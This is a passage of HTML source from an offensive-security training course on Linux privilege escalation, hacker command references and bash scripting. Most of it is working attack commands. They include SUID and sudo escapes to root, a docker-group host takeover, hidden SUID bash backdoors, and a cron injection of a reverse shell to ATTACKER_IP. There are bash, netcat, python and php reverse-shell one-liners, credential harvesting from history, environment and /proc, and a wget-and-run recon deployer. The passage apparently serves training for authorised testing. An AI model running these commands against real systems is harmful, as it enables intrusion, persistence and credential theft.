<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — post-exploitation checklist</div></div><div class="code-body"><span class="cm"># ── STEP 1: Stabilise your shell</span>
python3 -c <span class="cs">'import pty; pty.spawn("/bin/bash")'</span>
<span class="cm"># Ctrl+Z then:</span>
stty raw -echo; fg
export TERM=xterm

<span class="cm"># ── STEP 2: Who am I?</span>
whoami && id && hostname
uname -r                    <span class="cm"># Kernel version → check for exploits</span>
cat /proc/version
cat /etc/os-release | head -5

<span class="cm"># ── STEP 3: What can I do?</span>
sudo -l                     <span class="cm"># FIRST THING — sudo misconfiguration</span>
cat /etc/crontab            <span class="cm"># Cron jobs running as root</span>

<span class="cm"># ── STEP 4: Network context</span>
ip a && ip route            <span class="cm"># My IPs — multiple = pivot opportunity</span>
ss -tulpn                   <span class="cm"># Internal services not exposed externally</span>
arp -a                      <span class="cm"># Other hosts on the LAN</span>

<span class="cm"># ── STEP 5: Privilege escalation recon</span>
find / -perm -4000 -user root -type f 2>/dev/null  <span class="cm"># SUID binaries</span>
find / -writable -type f 2>/dev/null | grep -v proc <span class="cm"># Writable files</span>
cat ~/.bash_history          <span class="cm"># Previous commands — often has passwords</span>
env | grep -iE <span class="cs">"pass|secret|key|token"</span>  <span class="cm"># Env credentials</span></div></div>

<div class="section-label">Resources for This Chapter</div>
<div class="resource-grid">
  <div class="resource-card" href="#"><div class="resource-name">TryHackMe: Linux Fundamentals</div><div class="resource-desc">3-part series covering all Linux basics interactively. Free tier.</div><div class="resource-type" style="background:rgba(0,212,255,0.1);color:#00d4ff;border:1px solid rgba(0,212,255,0.3)">PLATFORM</div></div>
  <div class="resource-card" href="#"><div class="resource-name">OverTheWire: Bandit</div><div class="resource-desc">Linux skills as a game. Levels 0–34. Start at Level 0 today.</div><div class="resource-type" style="background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.3)">WARGAME</div></div>
  <div class="resource-card" href="#"><div class="resource-name">GTFOBins</div><div class="resource-desc">gtfobins.github.io — abuse of Unix binaries for privesc. Bookmark it.</div><div class="resource-type" style="background:rgba(255,68,85,0.1);color:#ff4455;border:1px solid rgba(255,68,85,0.3)">REFERENCE</div></div>
  <div class="resource-card" href="#"><div class="resource-name">HackTricks: Linux PrivEsc</div><div class="resource-desc">book.hacktricks.xyz — the complete privilege escalation bible.</div><div class="resource-type" style="background:rgba(255,140,0,0.1);color:#ff8c00;border:1px solid rgba(255,140,0,0.3)">REFERENCE</div></div>
</div>`,

// ── CHAPTER 3: PERMISSIONS ───────────────────────────────
ch3: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 03</span>
    <span class="ch-phase" style="background:rgba(255,68,85,0.1);color:#ff4455;border:1px solid rgba(255,68,85,0.3)">Phase 1 — Critical</span>
  </div>
  <h2>Linux Permissions <span class="accent">&amp; Privilege Escalation</span></h2>
  <p class="chapter-intro">Every privilege escalation attack is a permission misconfiguration. Understanding the Linux permission model at the deepest level — including SUID, SGID, sticky bit, and sudo — is the engine of post-exploitation.</p>
</div>

<div class="five-w">
  <div class="w-card"><div class="w-word">WHY</div><div class="w-text">Linux was multi-user from day one. Permissions prevent users from reading each other's data or breaking the OS. <strong>PrivEsc breaks this boundary.</strong></div></div>
  <div class="w-card"><div class="w-word">HOW</div><div class="w-text">Each file has an inode with owner UID, group GID, and 12 permission bits. Kernel checks these on every access via the EUID of the calling process.</div></div>
  <div class="w-card"><div class="w-word">WHERE</div><div class="w-text">Every file, directory, device, socket on the filesystem. No exceptions. Everything has an owner and permission mask.</div></div>
  <div class="w-card"><div class="w-word">WHEN</div><div class="w-text">The moment you land on a box with limited access. Your entire strategy is: find what's misconfigured → exploit it → escalate → pillage.</div></div>
  <div class="w-card"><div class="w-word">TO WHOM</div><div class="w-text">Penetration testers, CTF players, sysadmins hardening systems, blue teamers auditing permission settings, developers who write deployment scripts.</div></div>
</div>

<div class="section-label">Reading Permission Strings</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">permission string anatomy</div></div><div class="code-body">  -  rwx  r-x  r--
  ↑   ↑    ↑    ↑
  │   │    │    └─ Others: read only
  │   │    └────── Group:  read + execute
  │   └─────────── User:   read + write + execute
  └─────────────── File type: - (regular) d (dir) l (symlink)

<span class="cm"># Octal values:  r=4   w=2   x=1</span>
<span class="cm"># rwx = 4+2+1 = 7   r-x = 4+0+1 = 5   r-- = 4+0+0 = 4</span>
chmod 755 file   <span class="cm"># rwxr-xr-x → owner all, group/others read+execute</span>
chmod 644 file   <span class="cm"># rw-r--r--  → owner rw, everyone else read</span>
chmod 600 file   <span class="cm"># rw-------  → SSH private keys MUST be this</span>
chmod 4755 file  <span class="cm"># SUID + rwxr-xr-x → runs as owner (dangerous if root)</span></div></div>

<div class="section-label">SUID — The Most Exploited Permission</div>
<div class="hack-box">
  <div class="hack-box-title">⚔️ SUID Deep Dive — Set User ID on Execution</div>
  <div class="hack-box-body">
    <strong>WHY it exists:</strong> /usr/bin/passwd needs to write to /etc/shadow (root-only) but regular users run it. Solution: make passwd SUID root. It runs as root temporarily, writes the hash, then drops privileges.<br><br>
    <strong>HOW it works internally:</strong> The kernel reads the SUID bit from the inode during execve(). If set, it assigns the file owner's UID as the process's <strong>Effective UID (EUID)</strong>. Your Real UID stays yours. Access control checks use EUID — so you act as root.<br><br>
    <strong>HOW to exploit:</strong> Find SUID binary → check GTFOBins → run the escape. bash -p preserves EUID instead of resetting it (bash normally drops SUID as a security measure — -p prevents this).
  </div>
</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — SUID attack chain</div></div><div class="code-body"><span class="cm"># Step 1: Find SUID binaries owned by root</span>
find / -perm -4000 -user root -type f 2>/dev/null

<span class="cm"># Step 2: For each result → check GTFOBins.github.io</span>
<span class="cm"># Example exploits:</span>

<span class="cm"># SUID find:</span>
find . -exec /bin/sh \; -quit

<span class="cm"># SUID vim:</span>
vim -c <span class="cs">':!/bin/bash'</span>

<span class="cm"># SUID bash (misconfigured):</span>
/bin/bash -p                <span class="cm"># -p preserves EUID = root shell</span>

<span class="cm"># SUID python3:</span>
python3 -c <span class="cs">'import os; os.setuid(0); os.system("/bin/bash")'</span>

<span class="cm"># Step 3: Confirm root</span>
id                          <span class="cm"># uid=0(root) euid=0(root)</span></div></div>

<div class="section-label">8 Most Common Privilege Escalation Vectors</div>
<div class="table-wrap">
<table>
<thead><tr><th>#</th><th>Vector</th><th>How to Find</th><th>Impact</th></tr></thead>
<tbody>
<tr><td>1</td><td><strong>Sudo Misconfiguration</strong></td><td><code>sudo -l</code> → NOPASSWD entries</td><td>Critical — often instant root via GTFOBins</td></tr>
<tr><td>2</td><td><strong>SUID Binary Abuse</strong></td><td><code>find / -perm -4000 -user root</code></td><td>Critical — 60+ exploitable binaries on GTFOBins</td></tr>
<tr><td>3</td><td><strong>Writable Cron Script</strong></td><td><code>cat /etc/crontab</code> → check script permissions</td><td>Critical — timed root execution</td></tr>
<tr><td>4</td><td><strong>Writable /etc/passwd</strong></td><td><code>ls -la /etc/passwd</code> → world-writable?</td><td>Critical — add root user directly</td></tr>
<tr><td>5</td><td><strong>Kernel Exploit</strong></td><td><code>uname -r</code> → searchsploit / exploit-suggester</td><td>Critical — bypasses all userspace controls</td></tr>
<tr><td>6</td><td><strong>PATH Hijacking</strong></td><td><code>strings suid-binary</code> → commands without full path</td><td>High — requires writable PATH directory</td></tr>
<tr><td>7</td><td><strong>LD_PRELOAD Hijacking</strong></td><td><code>sudo -l</code> → env_keep+=LD_PRELOAD</td><td>High — library injection as root</td></tr>
<tr><td>8</td><td><strong>Credential Exposure</strong></td><td><code>cat ~/.bash_history; grep -r password /etc/</code></td><td>High — most common real-world vector</td></tr>
</tbody>
</table>
</div>

<div class="section-label">Complete Privesc Checklist</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — full privilege escalation checklist</div></div><div class="code-body"><span class="cm"># ── 1. SUDO (check FIRST always)</span>
sudo -l
cat /etc/sudoers 2>/dev/null

<span class="cm"># ── 2. SUID binaries</span>
find / -perm -4000 -user root -type f 2>/dev/null

<span class="cm"># ── 3. CRON jobs</span>
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/

<span class="cm"># ── 4. Writable critical files</span>
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab
find / -writable -type f 2>/dev/null | grep -v proc

<span class="cm"># ── 5. Kernel version</span>
uname -r
<span class="cm"># → search: searchsploit linux kernel [version]</span>
<span class="cm"># → run: linux-exploit-suggester.sh</span>

<span class="cm"># ── 6. Credentials</span>
cat ~/.bash_history
env | grep -iE <span class="cs">"pass|secret|key|token|api"</span>
grep -rn <span class="cs">"password"</span> /var/www/ /etc/ /opt/ 2>/dev/null
find / -name <span class="cs">"*.env"</span> -o -name <span class="cs">"wp-config.php"</span> 2>/dev/null

<span class="cm"># ── 7. Dangerous group membership</span>
id | grep -E <span class="cs">"docker|lxd|disk|adm|shadow"</span>
<span class="cm"># docker group = root equivalent:</span>
docker run -v /:/mnt --rm -it alpine chroot /mnt sh</div></div>

<div class="section-label">Quiz — Chapter 3</div>
<div class="quiz-block">
  <div class="quiz-header"><div class="quiz-title">Permissions &amp; Privilege Escalation Quiz</div><div class="quiz-count">5 questions</div></div>
  <div class="quiz-questions">
    <div class="quiz-q"><div class="quiz-q-num">Q1</div><div class="quiz-q-text">sudo -l shows: (root) NOPASSWD: /usr/bin/find. Write the exact command to get a root shell and explain why it works.</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer">Command: <code>sudo find . -exec /bin/sh \; -quit</code><br><br>Why it works: sudo elevates to root EUID. find's -exec flag runs a command for each result — we give it /bin/sh. The semicolon ends the command. -quit stops after first match. /bin/sh inherits root EUID from find. Result: root shell.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q2</div><div class="quiz-q-text">You find /etc/crontab has: * * * * * root /opt/backup.sh. ls -la /opt/backup.sh shows -rwxrwxrwx. What do you do?</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer"><strong>* * * * *</strong> = every minute (max 60 second wait). The script is world-writable. Steps:<br>1. <code>echo 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1' &gt;&gt; /opt/backup.sh</code><br>2. Start listener: <code>nc -lvnp 4444</code><br>3. Wait up to 60 seconds → root shell arrives.<br><br>The script runs as root (specified in crontab), your reverse shell code executes as root.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q3</div><div class="quiz-q-text">Explain SUID — why it exists legitimately, and how exactly bash -p exploits a SUID bash binary.</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer"><strong>Legitimate use:</strong> /usr/bin/passwd needs root access to write /etc/shadow, but regular users run it. SUID makes it run as root (file owner) regardless of who executes it.<br><br><strong>SUID bash exploit:</strong> If /bin/bash has the SUID bit and root owns it, running bash normally would drop the SUID EUID back to your real UID (bash does this as a security measure). The <code>-p</code> flag (privileged mode) prevents this EUID reset — preserving root EUID. Result: root shell without needing root password.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q4</div><div class="quiz-q-text">What does being in the docker group mean for privilege escalation?</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer">Being in the docker group is <strong>equivalent to being root</strong>. Docker can mount the host filesystem inside containers. Command: <code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code> — this mounts the entire host filesystem at /mnt inside an Alpine container, then chroots into it. You now have unrestricted root access to the entire host filesystem including /etc/shadow, /root/.ssh/, and everything else.</div></div>
    <div class="quiz-q"><div class="quiz-q-num">Q5</div><div class="quiz-q-text">/etc/shadow shows: root:$6$salt$hash:18000:0:99999:7::: — decode every field and identify the hash algorithm.</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer"><strong>$6$</strong> = SHA-512 (hashcat mode 1800). <strong>$salt$hash</strong> = salt and the actual hash. <strong>18000</strong> = days since Jan 1 1970 password was last changed. <strong>0</strong> = minimum days before change allowed. <strong>99999</strong> = maximum days before password must change. <strong>7</strong> = warning days before expiry. <strong>:::</strong> = inactive/expire/reserved fields empty.<br><br>Crack with: <code>hashcat -m 1800 hash.txt rockyou.txt</code></div></div>
  </div>
</div>`,

// ── CHAPTER 4: 50 COMMANDS ───────────────────────────────
ch4: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 04</span>
    <span class="ch-phase" style="background:rgba(255,140,0,0.1);color:#ff8c00;border:1px solid rgba(255,140,0,0.3)">Phase 1 — Most Used</span>
  </div>
  <h2>50 Essential <span class="accent">Linux Commands</span></h2>
  <p class="chapter-intro">Not a cheat sheet — a deep reference. Every command answers Why, How, Where, When, To Whom, plus real hacking scenarios. The difference between typing commands and thinking in Linux.</p>
</div>

<div class="section-label">Navigation &amp; Filesystem</div>
<div class="cmd-table">
  <div class="cmd-row"><div class="cmd-name">ls -lahR</div><div class="cmd-desc"><strong>Why:</strong> See everything including hidden files, sizes, permissions. <strong>Hack:</strong> <code>ls -lt /etc/ | head -20</code> finds most recently modified configs. <code>ls -la ~</code> finds hidden dot-files with credentials.</div><div class="cmd-risk" style="background:rgba(0,212,255,0.1);color:#00d4ff;border:1px solid rgba(0,212,255,0.3)">RECON</div></div>
  <div class="cmd-row"><div class="cmd-name">find</div><div class="cmd-desc"><strong>Why:</strong> Search by any attribute — name, permission, owner, time, size. <strong>Hack:</strong> <code>find / -perm -4000 -user root 2>/dev/null</code> hunts SUID. <code>find / -name "*.env" 2>/dev/null</code> finds credential files.</div><div class="cmd-risk" style="background:rgba(255,68,85,0.1);color:#ff4455;border:1px solid rgba(255,68,85,0.3)">CRITICAL</div></div>
  <div class="cmd-row"><div class="cmd-name">grep -rn</div><div class="cmd-desc"><strong>Why:</strong> Recursive text search across all files. <strong>Hack:</strong> <code>grep -rn "password\|secret\|api_key" /var/www/ 2>/dev/null</code> — the single most productive command in pentesting. Finds credentials in source code.</div><div class="cmd-risk" style="background:rgba(255,68,85,0.1);color:#ff4455;border:1px solid rgba(255,68,85,0.3)">CRITICAL</div></div>
  <div class="cmd-row"><div class="cmd-name">cat /proc/*</div><div class="cmd-desc"><strong>Why:</strong> /proc is a virtual kernel filesystem. <strong>Hack:</strong> <code>cat /proc/[PID]/cmdline</code> shows passwords passed as arguments. <code>cat /proc/self/environ | tr '\0' '\n'</code> shows process environment with secrets.</div><div class="cmd-risk" style="background:rgba(255,68,85,0.1);color:#ff4455;border:1px solid rgba(255,68,85,0.3)">CRITICAL</div></div>
</div>

<div class="section-label">Permissions &amp; Privilege</div>
<div class="cmd-table">
  <div class="cmd-row"><div class="cmd-name">sudo -l</div><div class="cmd-desc"><strong>Why:</strong> Reveals what you can run as root. <strong>When:</strong> FIRST command after getting a shell. Every. Single. Time. NOPASSWD entries = instant escalation via GTFOBins.</div><div class="cmd-risk" style="background:rgba(255,68,85,0.1);color:#ff4455;border:1px solid rgba(255,68,85,0.3)">FIRST</div></div>
  <div class="cmd-row"><div class="cmd-name">id</div><div class="cmd-desc"><strong>Why:</strong> Shows UID, GID, and group membership. <strong>Hack:</strong> Check for docker, lxd, disk, adm, shadow groups — each is a privilege escalation path. After escalation: confirm uid=0(root).</div><div class="cmd-risk" style="background:rgba(255,68,85,0.1);color:#ff4455;border:1px solid rgba(255,68,85,0.3)">FIRST</div></div>
  <div class="cmd-row"><div class="cmd-name">chmod 4755</div><div class="cmd-desc"><strong>Why:</strong> Set SUID bit. <strong>Hack:</strong> Post-root: <code>chmod u+s /bin/bash</code> creates SUID bash backdoor. <code>cp /bin/bash /tmp/.bash && chmod 4755 /tmp/.bash</code> — hidden persistent backdoor.</div><div class="cmd-risk" style="background:rgba(255,140,0,0.1);color:#ff8c00;border:1px solid rgba(255,140,0,0.3)">POST-EXPLOIT</div></div>
</div>

<div class="section-label">Network Commands</div>
<div class="cmd-table">
  <div class="cmd-row"><div class="cmd-name">ss -tulpn</div><div class="cmd-desc"><strong>Why:</strong> Modern netstat. Shows all listening ports + processes. <strong>Hack:</strong> Find internal services (127.0.0.1 bound) not exposed externally. Port forward them: <code>ssh -L 8080:127.0.0.1:8080 user@target</code>.</div><div class="cmd-risk" style="background:rgba(168,85,247,0.1);color:#a855f7;border:1px solid rgba(168,85,247,0.3)">NETWORK</div></div>
  <div class="cmd-row"><div class="cmd-name">curl -v</div><div class="cmd-desc"><strong>Why:</strong> Manual HTTP requests with full header visibility. <strong>Hack:</strong> Test SSRF: <code>curl http://169.254.169.254/latest/meta-data/</code>. File transfer: <code>curl http://ATTACKER/exploit -o /tmp/exploit</code>. Steal cookies: <code>curl -b "session=stolen" http://target/profile</code>.</div><div class="cmd-risk" style="background:rgba(168,85,247,0.1);color:#a855f7;border:1px solid rgba(168,85,247,0.3)">NETWORK</div></div>
  <div class="cmd-row"><div class="cmd-name">nc -lvnp</div><div class="cmd-desc"><strong>Why:</strong> Netcat — raw TCP. Foundation of reverse shells. <strong>Hack:</strong> Listener: <code>nc -lvnp 4444</code>. File receive: <code>nc -lvnp 9999 > file</code>. Port scan: <code>nc -zv target 20-100</code>. Banner grab: <code>echo "" | nc -w1 target 22</code>.</div><div class="cmd-risk" style="background:rgba(255,68,85,0.1);color:#ff4455;border:1px solid rgba(255,68,85,0.3)">SHELLS</div></div>
</div>

<div class="section-label">Text Processing (Log Analysis)</div>
<div class="cmd-table">
  <div class="cmd-row"><div class="cmd-name">awk '{print $11}'</div><div class="cmd-desc"><strong>Why:</strong> Extract specific fields from text. <strong>Hack:</strong> <code>grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn</code> — shows top attacking IPs from SSH auth log.</div><div class="cmd-risk" style="background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.3)">ANALYSIS</div></div>
  <div class="cmd-row"><div class="cmd-name">tail -f</div><div class="cmd-desc"><strong>Why:</strong> Real-time log monitoring using inotify(). <strong>Hack:</strong> <code>tail -f /var/log/apache2/access.log | grep shell</code> — watch if defenders detect your web shell. <code>tail -f /var/log/auth.log | grep "Accepted"</code> — see successful logins live.</div><div class="cmd-risk" style="background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.3)">ANALYSIS</div></div>
  <div class="cmd-row"><div class="cmd-name">sort | uniq -c</div><div class="cmd-desc"><strong>Why:</strong> Count unique occurrences. <strong>Hack:</strong> Turn raw log output into intelligence: top attacking IPs, most failed usernames, most common error codes. Pipeline: <code>cat | sort | uniq -c | sort -rn | head -10</code>.</div><div class="cmd-risk" style="background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.3)">ANALYSIS</div></div>
</div>

<div class="section-label">Hacker Toolkit</div>
<div class="cmd-table">
  <div class="cmd-row"><div class="cmd-name">strace</div><div class="cmd-desc"><strong>Why:</strong> Watch every syscall a program makes. <strong>Hack:</strong> <code>strace ./mystery_binary</code> — see what files it opens, what it reads, what network connections it makes. Used in malware analysis and CTF binary challenges.</div><div class="cmd-risk" style="background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.3)">ANALYSIS</div></div>
  <div class="cmd-row"><div class="cmd-name">xxd | head</div><div class="cmd-desc"><strong>Why:</strong> Hex dump of binary files. <strong>Hack:</strong> Check magic bytes: ELF=7f454c46, PNG=89504e47, ZIP=504b0304. CTF stego: <code>xxd image.png | grep -i flag</code> — flags hidden in binary files appear in ASCII column.</div><div class="cmd-risk" style="background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.3)">FORENSICS</div></div>
  <div class="cmd-row"><div class="cmd-name">base64 -w 0</div><div class="cmd-desc"><strong>Why:</strong> Encode binary as text for transfer. <strong>Hack:</strong> Transfer files through text channels: <code>base64 -w 0 exploit > b64.txt</code> then on victim <code>echo "BASE64" | base64 -d > /tmp/exploit</code>. Decode JWTs: <code>echo "eyJ..." | base64 -d</code>.</div><div class="cmd-risk" style="background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.3)">TRANSFER</div></div>
  <div class="cmd-row"><div class="cmd-name">ssh -L (tunnel)</div><div class="cmd-desc"><strong>Why:</strong> Port forward internal services to your machine. <strong>Hack:</strong> <code>ssh -L 3306:127.0.0.1:3306 user@target</code> — access target's internal MySQL from your localhost. Attack internal admin panels, databases, and services not exposed externally.</div><div class="cmd-risk" style="background:rgba(255,68,85,0.1);color:#ff4455;border:1px solid rgba(255,68,85,0.3)">PIVOTING</div></div>
</div>`,

// ── CHAPTER 5: BASH SCRIPTING ────────────────────────────
ch5: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 05</span>
    <span class="ch-phase" style="background:rgba(0,212,255,0.1);color:#00d4ff;border:1px solid rgba(0,212,255,0.3)">Phase 1 — Power Skill</span>
  </div>
  <h2>Bash Scripting <span class="accent">for Hackers</span></h2>
  <p class="chapter-intro">A hacker who types commands one at a time is slow. A hacker who writes scripts is fast, repeatable, and precise. LinPEAS — the most-used privilege escalation tool in the world — is written in Bash.</p>
</div>

<div class="five-w">
  <div class="w-card"><div class="w-word">WHY</div><div class="w-text">Automation separates script kiddies from security engineers. <strong>Build your own tools</strong> instead of depending on others' — customisable, undetected, precise.</div></div>
  <div class="w-card"><div class="w-word">HOW</div><div class="w-text">Bash reads scripts line by line. Built-ins (cd, echo, read) run in-process. External commands fork+exec. Pipes connect processes via kernel buffers — no disk I/O.</div></div>
  <div class="w-card"><div class="w-word">WHERE</div><div class="w-text">Recon automation, privesc checkers (LinPEAS is Bash), log parsers, custom exploit wrappers, network scanners, CTF automation, persistence mechanisms.</div></div>
  <div class="w-card"><div class="w-word">WHEN</div><div class="w-text">Any time you do something more than twice. Any time you loop over targets. Any time you combine more than 3 commands with logic.</div></div>
  <div class="w-card"><div class="w-word">TO WHOM</div><div class="w-text">Every person in cybersecurity. Non-negotiable skill for pentesters, red teamers, sysadmins, blue teamers, and CTF players.</div></div>
</div>

<div class="section-label">Script Anatomy — Every Line Has a Reason</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — professional script template</div></div><div class="code-body">#!/bin/bash
<span class="cm"># ↑ Shebang: tells kernel to use bash (not /bin/sh)</span>
<span class="cm"># Without this: missing arrays, [[ ]], process substitution</span>

set -euo pipefail
<span class="cm"># set -e  : exit immediately if ANY command fails</span>
<span class="cm"># set -u  : unset variable = error (catches typos)</span>
<span class="cm"># set -o pipefail: pipe fails if ANY stage fails</span>

<span class="cm"># Variables — NO spaces around =</span>
TARGET=<span class="cs">"192.168.1.1"</span>       <span class="cm"># String</span>
PORT=<span class="cv">80</span>                  <span class="cm"># Integer (stored as string)</span>
readonly API_KEY=<span class="cs">"abc"</span>   <span class="cm"># Constant</span>

<span class="cm"># Command substitution — capture output</span>
USER=$(whoami)
KERNEL=$(uname -r)

<span class="cm"># Special variables</span>
echo $0   <span class="cm"># Script name</span>
echo $1   <span class="cm"># First argument</span>
echo $#   <span class="cm"># Number of arguments</span>
echo $?   <span class="cm"># Last exit code (0=success)</span>
echo $$   <span class="cm"># This script's PID</span>

<span class="cm"># Redirection</span>
command > file        <span class="cm"># Stdout to file (overwrite)</span>
command >> file       <span class="cm"># Stdout to file (append)</span>
command 2>/dev/null   <span class="cm"># Discard errors (hacker's best friend)</span>
command &> file       <span class="cm"># Both stdout AND stderr to file</span>
command | tee file    <span class="cm"># Show output AND save to file</span></div></div>

<div class="section-label">Control Flow — Conditions &amp; Loops</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — conditionals and loops</div></div><div class="code-body"><span class="cm"># ── CONDITIONALS ── always use [[ ]] not [ ]</span>
if [[ -f <span class="cs">"/etc/shadow"</span> && -r <span class="cs">"/etc/shadow"</span> ]]; then
    echo <span class="cs">"Shadow readable — possible root!"</span>
fi

if [[ -w <span class="cs">"/etc/passwd"</span> ]]; then
    echo <span class="cs">"CRITICAL: /etc/passwd is world-writable!"</span>
fi

if (( EUID == 0 )); then
    echo <span class="cs">"Already root!"</span>
fi

<span class="cm"># ── LOOPS ──</span>
<span class="cm"># For over list</span>
for IP in <span class="cs">192.168.1.1</span> <span class="cs">192.168.1.2</span> <span class="cs">10.0.0.1</span>; do
    ping -c1 -W1 <span class="cs">"$IP"</span> &>/dev/null && echo <span class="cs">"ALIVE: $IP"</span>
done

<span class="cm"># For numeric range (subnet scan)</span>
for i in $(seq 1 254); do
    HOST=<span class="cs">"192.168.1.$i"</span>
    ping -c1 -W1 <span class="cs">"$HOST"</span> &>/dev/null && echo <span class="cs">"$HOST"</span> &
done
wait   <span class="cm"># Wait for all background pings</span>

<span class="cm"># While read — iterate lines (most important loop pattern)</span>
while IFS= read -r line; do
    echo <span class="cs">"Processing: $line"</span>
done < /etc/passwd

<span class="cm"># AND/OR chains</span>
ping -c1 target &>/dev/null && echo <span class="cs">"UP"</span> || echo <span class="cs">"DOWN"</span>
[[ -f /tmp/lockfile ]] || <span class="ck">touch</span> /tmp/lockfile</div></div>

<div class="section-label">Auto-Recon Script — Deploy on Landing</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — auto_recon.sh (run first on every compromised box)</div></div><div class="code-body">#!/bin/bash
<span class="cm"># Usage: ./auto_recon.sh</span>
<span class="cm"># Deploy: wget http://ATTACKER:8000/auto_recon.sh -O /tmp/ar.sh && bash /tmp/ar.sh</span>

R=<span class="cs">'\033[0;31m'</span> G=<span class="cs">'\033[0;32m'</span> Y=<span class="cs">'\033[1;33m'</span> B=<span class="cs">'\033[0;34m'</span> NC=<span class="cs">'\033[0m'</span>
found() { echo -e <span class="cs">"${R}[!!!] $1${NC}"</span>; }
ok()    { echo -e <span class="cs">"${G}[+]  $1${NC}"</span>; }
info()  { echo -e <span class="cs">"${B}[*]  $1${NC}"</span>; }

info <span class="cs">"Identity: $(whoami) | $(id)"</span>
info <span class="cs">"Kernel: $(uname -r)"</span>
info <span class="cs">"OS: $(grep PRETTY_NAME /etc/os-release | cut -d'\"' -f2)"</span>

<span class="cm"># Sudo</span>
SUDO=$(sudo -l 2>/dev/null)
echo <span class="cs">"$SUDO"</span> | grep -q NOPASSWD && found <span class="cs">"NOPASSWD sudo! Check GTFOBins"</span>

<span class="cm"># SUID</span>
found_suid=<span class="cs">""</span>
while IFS= read -r f; do
    found_suid=<span class="cs">"$found_suid\n  $f"</span>
done < <(find / -perm -4000 -user root -type f 2>/dev/null)
[[ -n <span class="cs">"$found_suid"</span> ]] && found <span class="cs">"SUID binaries:$found_suid"</span>

<span class="cm"># Critical writable files</span>
for f in /etc/passwd /etc/shadow /etc/sudoers /etc/crontab; do
    [[ -w <span class="cs">"$f"</span> ]] && found <span class="cs">"WRITABLE: $f"</span>
done

<span class="cm"># Cron</span>
info <span class="cs">"Cron jobs:"</span>
cat /etc/crontab 2>/dev/null | grep -v <span class="cs">"^#\|^$"</span>

<span class="cm"># Network</span>
info <span class="cs">"Internal services:"</span>
ss -tulpn 2>/dev/null | grep <span class="cs">"127.0.0.1"</span>

<span class="cm"># Credentials</span>
info <span class="cs">"Bash history:"</span>; cat ~/.bash_history 2>/dev/null | tail -20
info <span class="cs">"Environment:"</span>; env | grep -iE <span class="cs">"pass|secret|key|token|api"</span> 2>/dev/null

echo -e <span class="cs">"\n${G}Recon done. Review [!!!] items above.${NC}"</span></div></div>

<div class="section-label">Reverse Shell Generator</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">reverse shell one-liners — for authorised lab use only</div></div><div class="code-body"><span class="cm"># ── STEP 1: Start listener on YOUR attacker machine</span>
nc -lvnp 4444

<span class="cm"># ── STEP 2: Run ONE of these on the TARGET (authorised labs only)</span>

<span class="cm"># Bash TCP (most common)</span>
bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1

<span class="cm"># Bash mkfifo (when above doesn't work)</span>
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2&gt;&amp;1 | nc ATTACKER 4444 &gt;/tmp/f

<span class="cm"># Python3 (most reliable)</span>
python3 -c <span class="cs">'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'</span>

<span class="cm"># PHP (for web shells)</span>
php -r <span class="cs">'$s=fsockopen("IP",4444);$p=proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$pi);'</span>

<span class="cm"># ── STEP 3: Stabilise received shell</span>
python3 -c <span class="cs">'import pty; pty.spawn("/bin/bash")'</span>
<span class="cm"># Ctrl+Z → stty raw -echo; fg → Enter twice</span>
export TERM=xterm && stty rows 38 cols 142</div></div>`,

// ── CHAPTER 6: PYTHON ────────────────────────────────────
ch6: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 06</span>
